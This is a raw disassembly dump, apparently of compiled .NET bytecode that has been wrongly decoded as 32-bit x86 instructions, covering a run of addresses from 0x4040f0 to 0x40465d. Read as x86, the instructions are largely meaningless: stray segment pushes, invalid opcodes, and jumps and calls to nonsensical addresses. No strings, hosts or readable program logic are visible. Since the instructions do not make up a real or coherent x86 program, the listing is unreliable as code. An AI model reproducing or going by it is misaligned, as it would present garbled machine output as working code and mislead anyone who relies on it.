  4040f0:	1b 02                	sbb    (%edx),%eax
  4040f2:	20 cd                	and    %cl,%ch
  4040f4:	00 00                	add    %al,(%eax)
  4040f6:	00 6f 62             	add    %ch,0x62(%edi)
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	0a 02                	or     (%edx),%al
  4040fd:	03 68 28             	add    0x28(%eax),%ebp
  404100:	29 00                	sub    %eax,(%eax)
  404102:	00 06                	add    %al,(%esi)
  404104:	16                   	push   %ss
  404105:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  404108:	00 00                	add    %al,(%eax)
  40410a:	0a 2a                	or     (%edx),%ch
  40410c:	03 15 6e 30 1b 02    	add    0x21b306e,%edx
  404112:	20 ce                	and    %cl,%dh
  404114:	00 00                	add    %al,(%eax)
  404116:	00 6f 62             	add    %ch,0x62(%edi)
  404119:	00 00                	add    %al,(%eax)
  40411b:	0a 02                	or     (%edx),%al
  40411d:	03 69 28             	add    0x28(%ecx),%ebp
  404120:	28 00                	sub    %al,(%eax)
  404122:	00 06                	add    %al,(%esi)
  404124:	16                   	push   %ss
  404125:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  404128:	00 00                	add    %al,(%eax)
  40412a:	0a 2a                	or     (%edx),%ch
  40412c:	02 20                	add    (%eax),%ah
  40412e:	d3 00                	roll   %cl,(%eax)
  404130:	00 00                	add    %al,(%eax)
  404132:	6f                   	outsl  %ds:(%esi),(%dx)
  404133:	62 00                	bound  %eax,(%eax)
  404135:	00 0a                	add    %cl,(%edx)
  404137:	02 03                	add    (%ebx),%al
  404139:	28 27                	sub    %ah,(%edi)
  40413b:	00 00                	add    %al,(%eax)
  40413d:	06                   	push   %es
  40413e:	16                   	push   %ss
  40413f:	1e                   	push   %ds
  404140:	6f                   	outsl  %ds:(%esi),(%dx)
  404141:	4c                   	dec    %esp
  404142:	00 00                	add    %al,(%eax)
  404144:	0a 2a                	or     (%edx),%ch
  404146:	03 20                	add    (%eax),%esp
  404148:	00 00                	add    %al,(%eax)
  40414a:	00 80 6a 30 1a 02    	add    %al,0x21a306a(%eax)
  404150:	20 d3                	and    %dl,%bl
  404152:	00 00                	add    %al,(%eax)
  404154:	00 6f 62             	add    %ch,0x62(%edi)
  404157:	00 00                	add    %al,(%eax)
  404159:	0a 02                	or     (%edx),%al
  40415b:	03 28                	add    (%eax),%ebp
  40415d:	27                   	daa
  40415e:	00 00                	add    %al,(%eax)
  404160:	06                   	push   %es
  404161:	16                   	push   %ss
  404162:	1e                   	push   %ds
  404163:	6f                   	outsl  %ds:(%esi),(%dx)
  404164:	4c                   	dec    %esp
  404165:	00 00                	add    %al,(%eax)
  404167:	0a 2a                	or     (%edx),%ch
  404169:	03 20                	add    (%eax),%esp
  40416b:	00 80 ff ff 6a 30    	add    %al,0x306affff(%eax)
  404171:	1b 02                	sbb    (%edx),%eax
  404173:	20 d2                	and    %dl,%dl
  404175:	00 00                	add    %al,(%eax)
  404177:	00 6f 62             	add    %ch,0x62(%edi)
  40417a:	00 00                	add    %al,(%eax)
  40417c:	0a 02                	or     (%edx),%al
  40417e:	03 69 28             	add    0x28(%ecx),%ebp
  404181:	28 00                	sub    %al,(%eax)
  404183:	00 06                	add    %al,(%esi)
  404185:	16                   	push   %ss
  404186:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  404189:	00 00                	add    %al,(%eax)
  40418b:	0a 2a                	or     (%edx),%ch
  40418d:	03 1f                	add    (%edi),%ebx
  40418f:	80 6a 30 1b          	subb   $0x1b,0x30(%edx)
  404193:	02 20                	add    (%eax),%ah
  404195:	d1 00                	roll   $1,(%eax)
  404197:	00 00                	add    %al,(%eax)
  404199:	6f                   	outsl  %ds:(%esi),(%dx)
  40419a:	62 00                	bound  %eax,(%eax)
  40419c:	00 0a                	add    %cl,(%edx)
  40419e:	02 03                	add    (%ebx),%al
  4041a0:	68 28 29 00 00       	push   $0x2928
  4041a5:	06                   	push   %es
  4041a6:	16                   	push   %ss
  4041a7:	18 6f 4c             	sbb    %ch,0x4c(%edi)
  4041aa:	00 00                	add    %al,(%eax)
  4041ac:	0a 2a                	or     (%edx),%ch
  4041ae:	03 1f                	add    (%edi),%ebx
  4041b0:	e0 6a                	loopne 0x40421c
  4041b2:	30 14 02             	xor    %dl,(%edx,%eax,1)
  4041b5:	20 d0                	and    %dl,%al
  4041b7:	00 00                	add    %al,(%eax)
  4041b9:	00 6f 62             	add    %ch,0x62(%edi)
  4041bc:	00 00                	add    %al,(%eax)
  4041be:	0a 02                	or     (%edx),%al
  4041c0:	03 d2                	add    %edx,%edx
  4041c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c3:	62 00                	bound  %eax,(%eax)
  4041c5:	00 0a                	add    %cl,(%edx)
  4041c7:	2a 02                	sub    (%edx),%al
  4041c9:	03 d2                	add    %edx,%edx
  4041cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041cc:	62 00                	bound  %eax,(%eax)
  4041ce:	00 0a                	add    %cl,(%edx)
  4041d0:	2a 00                	sub    (%eax),%al
  4041d2:	00 00                	add    %al,(%eax)
  4041d4:	1b 30                	sbb    (%eax),%esi
  4041d6:	06                   	push   %es
  4041d7:	00 b9 02 00 00 17    	add    %bh,0x17000002(%ecx)
  4041dd:	00 00                	add    %al,(%eax)
  4041df:	11 7e 05             	adc    %edi,0x5(%esi)
  4041e2:	00 00                	add    %al,(%eax)
  4041e4:	04 28                	add    $0x28,%al
  4041e6:	85 00                	test   %eax,(%eax)
  4041e8:	00 0a                	add    %cl,(%edx)
  4041ea:	7e 06                	jle    0x4041f2
  4041ec:	00 00                	add    %al,(%eax)
  4041ee:	04 28                	add    $0x28,%al
  4041f0:	86 00                	xchg   %al,(%eax)
  4041f2:	00 0a                	add    %cl,(%edx)
  4041f4:	73 87                	jae    0x40417d
  4041f6:	00 00                	add    %al,(%eax)
  4041f8:	0a 0a                	or     (%edx),%cl
  4041fa:	28 88 00 00 0a 6f    	sub    %cl,0x6f0a0000(%eax)
  404200:	89 00                	mov    %eax,(%eax)
  404202:	00 0a                	add    %cl,(%edx)
  404204:	6f                   	outsl  %ds:(%esi),(%dx)
  404205:	8a 00                	mov    (%eax),%al
  404207:	00 0a                	add    %cl,(%edx)
  404209:	06                   	push   %es
  40420a:	6f                   	outsl  %ds:(%esi),(%dx)
  40420b:	8b 00                	mov    (%eax),%eax
  40420d:	00 0a                	add    %cl,(%edx)
  40420f:	28 8c 00 00 0a 39 7a 	sub    %cl,0x7a390a00(%eax,%eax,1)
  404216:	02 00                	add    (%eax),%al
  404218:	00 16                	add    %dl,(%esi)
  40421a:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  40421d:	10 20                	adc    %ah,(%eax)
  40421f:	e8 03 00 00 28       	call   0x28404227
  404224:	14 00                	adc    $0x0,%al
  404226:	00 0a                	add    %cl,(%edx)
  404228:	11 04 17             	adc    %eax,(%edi,%edx,1)
  40422b:	58                   	pop    %eax
  40422c:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40422f:	04 1f                	add    $0x1f,%al
  404231:	0a 32                	or     (%edx),%dh
  404233:	ea 28 8d 00 00 0a 13 	ljmp   $0x130a,$0x8d28
  40423a:	05 16 13 06 2b       	add    $0x2b061316,%eax
  40423f:	32 11                	xor    (%ecx),%dl
  404241:	05 11 06 9a 13       	add    $0x139a0611,%eax
  404246:	07                   	pop    %es
  404247:	11 07                	adc    %eax,(%edi)
  404249:	6f                   	outsl  %ds:(%esi),(%dx)
  40424a:	89 00                	mov    %eax,(%eax)
  40424c:	00 0a                	add    %cl,(%edx)
  40424e:	6f                   	outsl  %ds:(%esi),(%dx)
  40424f:	8a 00                	mov    (%eax),%al
  404251:	00 0a                	add    %cl,(%edx)
  404253:	06                   	push   %es
  404254:	6f                   	outsl  %ds:(%esi),(%dx)
  404255:	8b 00                	mov    (%eax),%eax
  404257:	00 0a                	add    %cl,(%edx)
  404259:	28 27                	sub    %ah,(%edi)
  40425b:	00 00                	add    %al,(%eax)
  40425d:	0a 2c 07             	or     (%edi,%eax,1),%ch
  404260:	11 07                	adc    %eax,(%edi)
  404262:	6f                   	outsl  %ds:(%esi),(%dx)
  404263:	8e 00                	mov    (%eax),%es
  404265:	00 0a                	add    %cl,(%edx)
  404267:	de 03                	fiadds (%ebx)
  404269:	26 de 00             	fiadds %es:(%eax)
  40426c:	11 06                	adc    %eax,(%esi)
  40426e:	17                   	pop    %ss
  40426f:	58                   	pop    %eax
  404270:	13 06                	adc    (%esi),%eax
  404272:	11 06                	adc    %eax,(%esi)
  404274:	11 05 8e 69 32 c6    	adc    %eax,0xc632698e
  40427a:	28 81 00 00 06 2c    	sub    %al,0x2c060000(%ecx)
  404280:	7e 73                	jle    0x4042f5
  404282:	8f 00                	pop    (%eax)
  404284:	00 0a                	add    %cl,(%edx)
  404286:	13 08                	adc    (%eax),%ecx
  404288:	11 08                	adc    %ecx,(%eax)
  40428a:	73 90                	jae    0x40421c
  40428c:	00 00                	add    %al,(%eax)
  40428e:	0a 13                	or     (%ebx),%dl
  404290:	09 11                	or     %edx,(%ecx)
  404292:	09 72 9d             	or     %esi,-0x63(%edx)
  404295:	21 00                	and    %eax,(%eax)
  404297:	70 6f                	jo     0x404308
  404299:	91                   	xchg   %eax,%ecx
  40429a:	00 00                	add    %al,(%eax)
  40429c:	0a 11                	or     (%ecx),%dl
  40429e:	09 1b                	or     %ebx,(%ebx)
  4042a0:	8d 39                	lea    (%ecx),%edi
  4042a2:	00 00                	add    %al,(%eax)
  4042a4:	01 25 16 72 b7 21    	add    %esp,0x21b77216
  4042aa:	00 70 a2             	add    %dh,-0x5e(%eax)
  4042ad:	25 17 06 6f 8b       	and    $0x8b6f0617,%eax
  4042b2:	00 00                	add    %al,(%eax)
  4042b4:	0a 28                	or     (%eax),%ch
  4042b6:	92                   	xchg   %eax,%edx
  4042b7:	00 00                	add    %al,(%eax)
  4042b9:	0a a2 25 18 72 0b    	or     0xb721825(%edx),%ah
  4042bf:	22 00                	and    (%eax),%al
  4042c1:	70 a2                	jo     0x404265
  4042c3:	25 19 06 6f 8b       	and    $0x8b6f0619,%eax
  4042c8:	00 00                	add    %al,(%eax)
  4042ca:	0a a2 25 1a 72 1f    	or     0x1f721a25(%edx),%ah
  4042d0:	22 00                	and    (%eax),%al
  4042d2:	70 a2                	jo     0x404276
  4042d4:	28 93 00 00 0a 6f    	sub    %dl,0x6f0a0000(%ebx)
  4042da:	94                   	xchg   %eax,%esp
  4042db:	00 00                	add    %al,(%eax)
  4042dd:	0a 11                	or     (%ecx),%dl
  4042df:	09 17                	or     %edx,(%edi)
  4042e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4042e2:	95                   	xchg   %eax,%ebp
  4042e3:	00 00                	add    %al,(%eax)
  4042e5:	0a 11                	or     (%ecx),%dl
  4042e7:	09 17                	or     %edx,(%edi)
  4042e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4042ea:	96                   	xchg   %eax,%esi
  4042eb:	00 00                	add    %al,(%eax)
  4042ed:	0a 11                	or     (%ecx),%dl
  4042ef:	09 6f 97             	or     %ebp,-0x69(%edi)
  4042f2:	00 00                	add    %al,(%eax)
  4042f4:	0a 11                	or     (%ecx),%dl
  4042f6:	08 6f 98             	or     %ch,-0x68(%edi)
  4042f9:	00 00                	add    %al,(%eax)
  4042fb:	0a 26                	or     (%esi),%ah
  4042fd:	2b 4c 7e 99          	sub    -0x67(%esi,%edi,2),%ecx
  404301:	00 00                	add    %al,(%eax)
  404303:	0a 72 25             	or     0x25(%edx),%dh
  404306:	22 00                	and    (%eax),%al
  404308:	70 28                	jo     0x404332
  40430a:	9a 00 00 0a 18 6f 9b 	lcall  $0x9b6f,$0x180a0000
  404311:	00 00                	add    %al,(%eax)
  404313:	0a 13                	or     (%ebx),%dl
  404315:	0a 11                	or     (%ecx),%dl
  404317:	0a 06                	or     (%esi),%al
  404319:	6f                   	outsl  %ds:(%esi),(%dx)
  40431a:	8b 00                	mov    (%eax),%eax
  40431c:	00 0a                	add    %cl,(%edx)
  40431e:	28 92 00 00 0a 72    	sub    %dl,0x720a0000(%edx)
  404324:	83 22 00             	andl   $0x0,(%edx)
  404327:	70 06                	jo     0x40432f
  404329:	6f                   	outsl  %ds:(%esi),(%dx)
  40432a:	8b 00                	mov    (%eax),%eax
  40432c:	00 0a                	add    %cl,(%edx)
  40432e:	72 83                	jb     0x4042b3
  404330:	22 00                	and    (%eax),%al
  404332:	70 28                	jo     0x40435c
  404334:	9c                   	pushf
  404335:	00 00                	add    %al,(%eax)
  404337:	0a 6f 9d             	or     -0x63(%edi),%ch
  40433a:	00 00                	add    %al,(%eax)
  40433c:	0a de                	or     %dh,%bl
  40433e:	0c 11                	or     $0x11,%al
  404340:	0a 2c 07             	or     (%edi,%eax,1),%ch
  404343:	11 0a                	adc    %ecx,(%edx)
  404345:	6f                   	outsl  %ds:(%esi),(%dx)
  404346:	33 00                	xor    (%eax),%eax
  404348:	00 0a                	add    %cl,(%edx)
  40434a:	dc 06                	faddl  (%esi)
  40434c:	6f                   	outsl  %ds:(%esi),(%dx)
  40434d:	8b 00                	mov    (%eax),%eax
  40434f:	00 0a                	add    %cl,(%edx)
  404351:	28 73 00             	sub    %dh,0x0(%ebx)
  404354:	00 0a                	add    %cl,(%edx)
  404356:	2c 15                	sub    $0x15,%al
  404358:	06                   	push   %es
  404359:	6f                   	outsl  %ds:(%esi),(%dx)
  40435a:	8b 00                	mov    (%eax),%eax
  40435c:	00 0a                	add    %cl,(%edx)
  40435e:	28 9e 00 00 0a 20    	sub    %bl,0x200a0000(%esi)
  404364:	e8 03 00 00 28       	call   0x2840436c
  404369:	14 00                	adc    $0x0,%al
  40436b:	00 0a                	add    %cl,(%edx)
  40436d:	06                   	push   %es
  40436e:	6f                   	outsl  %ds:(%esi),(%dx)
  40436f:	8b 00                	mov    (%eax),%eax
  404371:	00 0a                	add    %cl,(%edx)
  404373:	17                   	pop    %ss
  404374:	73 77                	jae    0x4043ed
  404376:	00 00                	add    %al,(%eax)
  404378:	0a 28                	or     (%eax),%ch
  40437a:	88 00                	mov    %al,(%eax)
  40437c:	00 0a                	add    %cl,(%edx)
  40437e:	6f                   	outsl  %ds:(%esi),(%dx)
  40437f:	89 00                	mov    %eax,(%eax)
  404381:	00 0a                	add    %cl,(%edx)
  404383:	6f                   	outsl  %ds:(%esi),(%dx)
  404384:	8a 00                	mov    (%eax),%al
  404386:	00 0a                	add    %cl,(%edx)
  404388:	28 9f 00 00 0a 0b    	sub    %bl,0xb0a0000(%edi)
  40438e:	25 07 16 07 8e       	and    $0x8e071607,%eax
  404393:	69 6f 4c 00 00 0a 73 	imul   $0x730a0000,0x4c(%edi),%ebp
  40439a:	18 00                	sbb    %al,(%eax)
  40439c:	00 0a                	add    %cl,(%edx)
  40439e:	20 00                	and    %al,(%eax)
  4043a0:	00 71 02             	add    %dh,0x2(%ecx)
  4043a3:	20 00                	and    %al,(%eax)
  4043a5:	40                   	inc    %eax
  4043a6:	0d 03 6f 19 00       	or     $0x196f03,%eax
  4043ab:	00 0a                	add    %cl,(%edx)
  4043ad:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4043b1:	01 0c 73             	add    %ecx,(%ebx,%esi,2)
  4043b4:	18 00                	sbb    %al,(%eax)
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	08 6f a0             	or     %ch,-0x60(%edi)
  4043bb:	00 00                	add    %al,(%eax)
  4043bd:	0a 25 08 16 08 8e    	or     0x8e081608,%ah
  4043c3:	69 6f 4c 00 00 0a 6f 	imul   $0x6f0a0000,0x4c(%edi),%ebp
  4043ca:	41                   	inc    %ecx
  4043cb:	00 00                	add    %al,(%eax)
  4043cd:	0a 28                	or     (%eax),%ch
  4043cf:	82 00 00             	addb   $0x0,(%eax)
  4043d2:	06                   	push   %es
  4043d3:	28 a1 00 00 0a 72    	sub    %ah,0x720a0000(%ecx)
  4043d9:	87 22                	xchg   %esp,(%edx)
  4043db:	00 70 28             	add    %dh,0x28(%eax)
  4043de:	51                   	push   %ecx
  4043df:	00 00                	add    %al,(%eax)
  4043e1:	0a 0d 09 73 a2 00    	or     0xa27309,%cl
  4043e7:	00 0a                	add    %cl,(%edx)
  4043e9:	13 0b                	adc    (%ebx),%ecx
  4043eb:	11 0b                	adc    %ecx,(%ebx)
  4043ed:	72 91                	jb     0x404380
  4043ef:	22 00                	and    (%eax),%al
  4043f1:	70 6f                	jo     0x404462
  4043f3:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  4043f8:	0b 72 a5             	or     -0x5b(%edx),%esi
  4043fb:	22 00                	and    (%eax),%al
  4043fd:	70 6f                	jo     0x40446e
  4043ff:	a3 00 00 0a 11       	mov    %eax,0x110a0000
  404404:	0b 72 c5             	or     -0x3b(%edx),%esi
  404407:	22 00                	and    (%eax),%al
  404409:	70 06                	jo     0x404411
  40440b:	6f                   	outsl  %ds:(%esi),(%dx)
  40440c:	8b 00                	mov    (%eax),%eax
  40440e:	00 0a                	add    %cl,(%edx)
  404410:	72 83                	jb     0x404395
  404412:	22 00                	and    (%eax),%al
  404414:	70 28                	jo     0x40443e
  404416:	9c                   	pushf
  404417:	00 00                	add    %al,(%eax)
  404419:	0a 6f a3             	or     -0x5d(%edi),%ch
  40441c:	00 00                	add    %al,(%eax)
  40441e:	0a 11                	or     (%ecx),%dl
  404420:	0b 72 db             	or     -0x25(%edx),%esi
  404423:	22 00                	and    (%eax),%al
  404425:	70 28                	jo     0x40444f
  404427:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404428:	00 00                	add    %al,(%eax)
  40442a:	0a 28                	or     (%eax),%ch
  40442c:	51                   	push   %ecx
  40442d:	00 00                	add    %al,(%eax)
  40442f:	0a 6f a3             	or     -0x5d(%edi),%ch
  404432:	00 00                	add    %al,(%eax)
  404434:	0a 11                	or     (%ecx),%dl
  404436:	0b 72 e3             	or     -0x1d(%edx),%esi
  404439:	22 00                	and    (%eax),%al
  40443b:	70 09                	jo     0x404446
  40443d:	28 a5 00 00 0a 72    	sub    %ah,0x720a0000(%ebp)
  404443:	ef                   	out    %eax,(%dx)
  404444:	22 00                	and    (%eax),%al
  404446:	70 28                	jo     0x404470
  404448:	9c                   	pushf
  404449:	00 00                	add    %al,(%eax)
  40444b:	0a 6f a3             	or     -0x5d(%edi),%ch
  40444e:	00 00                	add    %al,(%eax)
  404450:	0a de                	or     %dh,%bl
  404452:	0c 11                	or     $0x11,%al
  404454:	0b 2c 07             	or     (%edi,%eax,1),%ebp
  404457:	11 0b                	adc    %ecx,(%ebx)
  404459:	6f                   	outsl  %ds:(%esi),(%dx)
  40445a:	33 00                	xor    (%eax),%eax
  40445c:	00 0a                	add    %cl,(%edx)
  40445e:	dc 73 90             	fdivl  -0x70(%ebx)
  404461:	00 00                	add    %al,(%eax)
  404463:	0a 25 09 6f 91 00    	or     0x916f09,%ah
  404469:	00 0a                	add    %cl,(%edx)
  40446b:	25 17 6f 96 00       	and    $0x966f17,%eax
  404470:	00 0a                	add    %cl,(%edx)
  404472:	25 16 6f a6 00       	and    $0xa66f16,%eax
  404477:	00 0a                	add    %cl,(%edx)
  404479:	25 16 6f a7 00       	and    $0xa76f16,%eax
  40447e:	00 0a                	add    %cl,(%edx)
  404480:	25 17 6f 95 00       	and    $0x956f17,%eax
  404485:	00 0a                	add    %cl,(%edx)
  404487:	28 a8 00 00 0a 26    	sub    %ch,0x260a0000(%eax)
  40448d:	16                   	push   %ss
  40448e:	28 16                	sub    %dl,(%esi)
  404490:	00 00                	add    %al,(%eax)
  404492:	0a de                	or     %dh,%bl
  404494:	03 26                	add    (%esi),%esp
  404496:	de 00                	fiadds (%eax)
  404498:	2a 00                	sub    (%eax),%al
  40449a:	00 00                	add    %al,(%eax)
  40449c:	41                   	inc    %ecx
  40449d:	64 00 00             	add    %al,%fs:(%eax)
  4044a0:	00 00                	add    %al,(%eax)
  4044a2:	00 00                	add    %al,(%eax)
  4044a4:	67 00 00             	add    %al,(%bx,%si)
  4044a7:	00 22                	add    %ah,(%edx)
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	00 89 00 00 00 03    	add    %cl,0x3000000(%ecx)
  4044b1:	00 00                	add    %al,(%eax)
  4044b3:	00 01                	add    %al,(%ecx)
  4044b5:	00 00                	add    %al,(%eax)
  4044b7:	01 02                	add    %eax,(%edx)
  4044b9:	00 00                	add    %al,(%eax)
  4044bb:	00 36                	add    %dh,(%esi)
  4044bd:	01 00                	add    %eax,(%eax)
  4044bf:	00 29                	add    %ch,(%ecx)
  4044c1:	00 00                	add    %al,(%eax)
  4044c3:	00 5f 01             	add    %bl,0x1(%edi)
  4044c6:	00 00                	add    %al,(%eax)
  4044c8:	0c 00                	or     $0x0,%al
  4044ca:	00 00                	add    %al,(%eax)
  4044cc:	00 00                	add    %al,(%eax)
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	02 00                	add    (%eax),%al
  4044d2:	00 00                	add    %al,(%eax)
  4044d4:	0b 02                	or     (%edx),%eax
  4044d6:	00 00                	add    %al,(%eax)
  4044d8:	68 00 00 00 73       	push   $0x73000000
  4044dd:	02 00                	add    (%eax),%al
  4044df:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	b5 02                	mov    $0x2,%ch
  4044f2:	00 00                	add    %al,(%eax)
  4044f4:	b5 02                	mov    $0x2,%ch
  4044f6:	00 00                	add    %al,(%eax)
  4044f8:	03 00                	add    (%eax),%eax
  4044fa:	00 00                	add    %al,(%eax)
  4044fc:	32 00                	xor    (%eax),%al
  4044fe:	00 01                	add    %al,(%ecx)
  404500:	1b 30                	sbb    (%eax),%esi
  404502:	02 00                	add    (%eax),%al
  404504:	2e 00 00             	add    %al,%cs:(%eax)
  404507:	00 18                	add    %bl,(%eax)
  404509:	00 00                	add    %al,(%eax)
  40450b:	11 21                	adc    %esp,(%ecx)
  40450d:	00 22                	add    %ah,(%edx)
  40450f:	e2 33                	loop   0x404544
  404511:	0e                   	push   %cs
  404512:	00 00                	add    %al,(%eax)
  404514:	00 0a                	add    %cl,(%edx)
  404516:	28 aa 00 00 0a 28    	sub    %ch,0x280a0000(%edx)
  40451c:	ab                   	stos   %eax,%es:(%edi)
  40451d:	00 00                	add    %al,(%eax)
  40451f:	0a 73 ac             	or     -0x54(%ebx),%dh
  404522:	00 00                	add    %al,(%eax)
  404524:	0a 28                	or     (%eax),%ch
  404526:	ad                   	lods   %ds:(%esi),%eax
  404527:	00 00                	add    %al,(%eax)
  404529:	0a 06                	or     (%esi),%al
  40452b:	30 04 17             	xor    %al,(%edi,%edx,1)
  40452e:	0b de                	or     %esi,%ebx
  404530:	07                   	pop    %es
  404531:	de 03                	fiadds (%ebx)
  404533:	26 de 00             	fiadds %es:(%eax)
  404536:	16                   	push   %ss
  404537:	2a 07                	sub    (%edi),%al
  404539:	2a 00                	sub    (%eax),%al
  40453b:	00 01                	add    %al,(%ecx)
  40453d:	10 00                	adc    %al,(%eax)
  40453f:	00 00                	add    %al,(%eax)
  404541:	00 00                	add    %al,(%eax)
  404543:	00 27                	add    %ah,(%edi)
  404545:	27                   	daa
  404546:	00 03                	add    %al,(%ebx)
  404548:	01 00                	add    %eax,(%eax)
  40454a:	00 01                	add    %al,(%ecx)
  40454c:	1b 30                	sbb    (%eax),%esi
  40454e:	02 00                	add    (%eax),%al
  404550:	28 00                	sub    %al,(%eax)
  404552:	00 00                	add    %al,(%eax)
  404554:	02 00                	add    (%eax),%al
  404556:	00 11                	add    %dl,(%ecx)
  404558:	73 ae                	jae    0x404508
  40455a:	00 00                	add    %al,(%eax)
  40455c:	0a 28                	or     (%eax),%ch
  40455e:	af                   	scas   %es:(%edi),%eax
  40455f:	00 00                	add    %al,(%eax)
  404561:	0a 6f 5b             	or     0x5b(%edi),%ch
  404564:	00 00                	add    %al,(%eax)
  404566:	0a 72 ff             	or     -0x1(%edx),%dh
  404569:	22 00                	and    (%eax),%al
  40456b:	70 6f                	jo     0x4045dc
  40456d:	b0 00                	mov    $0x0,%al
  40456f:	00 0a                	add    %cl,(%edx)
  404571:	2c 04                	sub    $0x4,%al
  404573:	17                   	pop    %ss
  404574:	0a de                	or     %dh,%bl
  404576:	07                   	pop    %es
  404577:	de 03                	fiadds (%ebx)
  404579:	26 de 00             	fiadds %es:(%eax)
  40457c:	16                   	push   %ss
  40457d:	2a 06                	sub    (%esi),%al
  40457f:	2a 01                	sub    (%ecx),%al
  404581:	10 00                	adc    %al,(%eax)
  404583:	00 00                	add    %al,(%eax)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 21                	add    %ah,(%ecx)
  404589:	21 00                	and    %eax,(%eax)
  40458b:	03 01                	add    (%ecx),%eax
  40458d:	00 00                	add    %al,(%eax)
  40458f:	01 1b                	add    %ebx,(%ebx)
  404591:	30 02                	xor    %al,(%edx)
  404593:	00 d0                	add    %dl,%al
  404595:	00 00                	add    %al,(%eax)
  404597:	00 19                	add    %bl,(%ecx)
  404599:	00 00                	add    %al,(%eax)
  40459b:	11 72 05             	adc    %esi,0x5(%edx)
  40459e:	23 00                	and    (%eax),%eax
  4045a0:	70 73                	jo     0x404615
  4045a2:	b1 00                	mov    $0x0,%cl
  4045a4:	00 0a                	add    %cl,(%edx)
  4045a6:	0a 06                	or     (%esi),%al
  4045a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045a9:	b2 00                	mov    $0x0,%dl
  4045ab:	00 0a                	add    %cl,(%edx)
  4045ad:	0b 07                	or     (%edi),%eax
  4045af:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b0:	b3 00                	mov    $0x0,%bl
  4045b2:	00 0a                	add    %cl,(%edx)
  4045b4:	0c 2b                	or     $0x2b,%al
  4045b6:	7c 08                	jl     0x4045c0
  4045b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b9:	b4 00                	mov    $0x0,%ah
  4045bb:	00 0a                	add    %cl,(%edx)
  4045bd:	0d 09 72 4b 23       	or     $0x234b7209,%eax
  4045c2:	00 70 6f             	add    %dh,0x6f(%eax)
  4045c5:	b5 00                	mov    $0x0,%ch
  4045c7:	00 0a                	add    %cl,(%edx)
  4045c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ca:	38 00                	cmp    %al,(%eax)
  4045cc:	00 0a                	add    %cl,(%edx)
  4045ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4045cf:	5b                   	pop    %ebx
  4045d0:	00 00                	add    %al,(%eax)
  4045d2:	0a 13                	or     (%ebx),%dl
  4045d4:	04 11                	add    $0x11,%al
  4045d6:	04 72                	add    $0x72,%al
  4045d8:	65 23 00             	and    %gs:(%eax),%eax
  4045db:	70 28                	jo     0x404605
  4045dd:	27                   	daa
  4045de:	00 00                	add    %al,(%eax)
  4045e0:	0a 2c 21             	or     (%ecx,%eiz,1),%ch
  4045e3:	09 72 91             	or     %esi,-0x6f(%edx)
  4045e6:	23 00                	and    (%eax),%eax
  4045e8:	70 6f                	jo     0x404659
  4045ea:	b5 00                	mov    $0x0,%ch
  4045ec:	00 0a                	add    %cl,(%edx)
  4045ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4045ef:	38 00                	cmp    %al,(%eax)
  4045f1:	00 0a                	add    %cl,(%edx)
  4045f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f4:	b6 00                	mov    $0x0,%dh
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	72 9d                	jb     0x404597
  4045fa:	23 00                	and    (%eax),%eax
  4045fc:	70 6f                	jo     0x40466d
  4045fe:	b0 00                	mov    $0x0,%al
  404600:	00 0a                	add    %cl,(%edx)
  404602:	2d 2a 11 04 72       	sub    $0x7204112a,%eax
  404607:	ad                   	lods   %ds:(%esi),%eax
  404608:	23 00                	and    (%eax),%eax
  40460a:	70 6f                	jo     0x40467b
  40460c:	b0 00                	mov    $0x0,%al
  40460e:	00 0a                	add    %cl,(%edx)
  404610:	2d 1c 09 72 91       	sub    $0x9172091c,%eax
  404615:	23 00                	and    (%eax),%eax
  404617:	70 6f                	jo     0x404688
  404619:	b5 00                	mov    $0x0,%ch
  40461b:	00 0a                	add    %cl,(%edx)
  40461d:	6f                   	outsl  %ds:(%esi),(%dx)
  40461e:	38 00                	cmp    %al,(%eax)
  404620:	00 0a                	add    %cl,(%edx)
  404622:	72 bb                	jb     0x4045df
  404624:	23 00                	and    (%eax),%eax
  404626:	70 28                	jo     0x404650
  404628:	27                   	daa
  404629:	00 00                	add    %al,(%eax)
  40462b:	0a 2c 05 17 13 05 de 	or     -0x21faece9(,%eax,1),%ch
  404632:	36 08 6f b7          	or     %ch,%ss:-0x49(%edi)
  404636:	00 00                	add    %al,(%eax)
  404638:	0a 3a                	or     (%edx),%bh
  40463a:	79 ff                	jns    0x40463b
  40463c:	ff                   	(bad)
  40463d:	ff                   	lcall  (bad)
  40463e:	de 0a                	fimuls (%edx)
  404640:	08 2c 06             	or     %ch,(%esi,%eax,1)
  404643:	08 6f 33             	or     %ch,0x33(%edi)
  404646:	00 00                	add    %al,(%eax)
  404648:	0a dc                	or     %ah,%bl
  40464a:	de 0a                	fimuls (%edx)
  40464c:	07                   	pop    %es
  40464d:	2c 06                	sub    $0x6,%al
  40464f:	07                   	pop    %es
  404650:	6f                   	outsl  %ds:(%esi),(%dx)
  404651:	33 00                	xor    (%eax),%eax
  404653:	00 0a                	add    %cl,(%edx)
  404655:	dc de                	(bad)
  404657:	0a 06                	or     (%esi),%al
  404659:	2c 06                	sub    $0x6,%al
  40465b:	06                   	push   %es
  40465c:	6f                   	outsl  %ds:(%esi),(%dx)
  40465d:	33 00                	xor    (%eax),%eax
